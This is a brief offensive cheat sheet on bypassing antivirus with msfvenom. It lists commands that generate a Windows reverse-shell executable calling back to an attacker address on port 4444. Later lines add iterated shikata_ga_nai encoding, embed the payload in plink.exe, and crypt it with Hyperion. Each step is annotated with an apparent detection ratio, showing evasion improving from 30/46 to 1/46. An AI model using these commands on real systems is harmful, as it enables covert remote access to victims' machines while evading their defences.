## Bypass w/ msfvenom

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -o shell.exe # 30/46
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell.exe # 34/46
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell.exe # 27/46
wine /usr/share/windows-binaries/hyperion/hyperion.exe shell.exe crypted.exe # 14/46
# custom python reverse shell compiled to exe # 2/46
# custom C reverse shellcode compiled to exe # 1/46
